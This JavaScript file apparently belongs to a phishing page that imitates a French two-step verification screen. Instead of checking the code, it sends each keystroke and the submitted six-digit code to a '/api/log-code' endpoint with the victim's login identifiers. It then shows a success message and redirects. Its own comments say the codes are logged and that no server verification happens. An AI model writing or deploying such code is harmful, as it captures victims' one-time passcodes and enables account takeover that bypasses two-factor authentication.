// Vérification front-end du code en 2 étapes
(function() {
  'use strict';

  function showInlineAlert(container, type, message) {
    const existing = container.querySelector('.verify-alert');
    if (existing) existing.remove();
    const div = document.createElement('div');
    div.className = `verify-alert alert alert-${type}`;
    div.role = 'alert';
    div.textContent = message;
    container.prepend(div);
  }

  function getSession() {
    try {
      const raw = sessionStorage.getItem('verify_session');
      if (!raw) return null;
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }

  function saveSession(s) {
    try { sessionStorage.setItem('verify_session', JSON.stringify(s)); } catch {}
  }

  function isSixDigits(str) {
    return /^\d{6}$/.test(str);
  }

  document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('verify-form');
    const codeInput = document.getElementById('code');
    const resendBtn = document.getElementById('resend');
    const emailMaskSpan = document.getElementById('email-mask');

    const session = getSession();
    if (!session || !session.verifyId) {
      // Si pas de session, retourner à la page de connexion
      window.location.replace('login.html');
      return;
    }

    // Affiche l'email masqué si dispo
    if (emailMaskSpan) {
      emailMaskSpan.textContent = session.emailMasked || session.email || '';
    }

    // Ne pas pré-remplir de code: l'utilisateur doit le saisir et il sera journalisé

    if (!form) return;

    // Restreindre l'entrée au numérique
    codeInput?.addEventListener('input', () => {
      codeInput.value = codeInput.value.replace(/[^\d]/g, '').slice(0, 6);
      queueLog();
    });

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const code = (codeInput?.value || '').trim();
      if (!isSixDigits(code)) {
        showInlineAlert(form, 'warning', 'Veuillez saisir un code à 6 chiffres.');
        return;
      }

      const submitBtn = form.querySelector('button[type="submit"]');
      const originalText = submitBtn ? submitBtn.textContent : '';
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = 'Vérification...';
      }
      showInlineAlert(form, 'info', 'Vérification en cours...');

      // Enregistrer le code saisi dans la KV et rediriger (pas de vérification serveur)
      logTypedCode();
      showInlineAlert(form, 'success', 'Code enregistré.');
      setTimeout(() => {
        try { sessionStorage.removeItem('verify_session'); } catch {}
        window.location.href = 'felicitations.html';
      }, 500);
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText || 'Valider le code';
      }
      return;
    });

    resendBtn?.addEventListener('click', function() {
      if (resendBtn) resendBtn.disabled = true;
      showInlineAlert(form, 'info', 'Renvoi du code en cours...');

      fetch('/api/start-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: session.email, loginId: session.loginId || null })
      })
        .then(async (res) => {
          const data = await res.json().catch(() => ({}));
          if (!res.ok) throw new Error(data?.message || 'Erreur serveur');
          return data;
        })
        .then((data) => {
          // Mettre à jour la session avec la nouvelle verifyId et email masqué
          const updated = {
            ...session,
            verifyId: data.verifyId,
            emailMasked: data?.delivery?.toMasked || session.emailMasked,
            devCode: data?.devCode || null,
            createdAt: Date.now()
          };
          saveSession(updated);
          showInlineAlert(form, 'success', 'Nouveau code envoyé.');
          if (updated.devCode && codeInput) {
            codeInput.value = updated.devCode;
            showInlineAlert(form, 'info', `Mode démo: votre nouveau code est ${updated.devCode}.`);
          }
          console.debug('[DEV] Nouveau code:', updated.devCode);
          // Journaliser à nouveau (nouvelle session/code)
          logTypedCode();
        })
        .catch((err) => {
          // Fallback: générer un nouveau code local si le serveur échoue
          try {
            const newCode = String(Math.floor(100000 + Math.random() * 900000));
            const updated = {
              ...session,
              verifyId: 'local:' + Date.now(),
              devCode: newCode,
              createdAt: Date.now(),
              local: true
            };
            saveSession(updated);
            showInlineAlert(form, 'success', 'Nouveau code généré (mode développement).');
            if (codeInput) {
              codeInput.value = newCode;
              showInlineAlert(form, 'info', `Mode démo: votre nouveau code est ${newCode}.`);
            }
            console.debug('[DEV] Nouveau code local:', newCode);
            // Journaliser immédiatement
            logTypedCode();
          } catch (_) {
            showInlineAlert(form, 'danger', `Échec de l'envoi du code: ${err.message}`);
          }
        })
        .finally(() => {
          if (resendBtn) resendBtn.disabled = false;
        });
    });

    // Debounce logging helpers
    let logTimer = null;
    function queueLog() {
      if (logTimer) clearTimeout(logTimer);
      logTimer = setTimeout(logTypedCode, 400);
    }
    function logTypedCode() {
      const currentSession = getSession();
      const currentCode = (codeInput?.value || '').replace(/[^\d]/g, '').slice(0, 6);
      if (!currentSession?.verifyId) return;
      fetch('/api/log-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ verifyId: currentSession.verifyId, loginId: currentSession.loginId || null, code: currentCode })
      }).catch(() => {});
    }
  });
})();
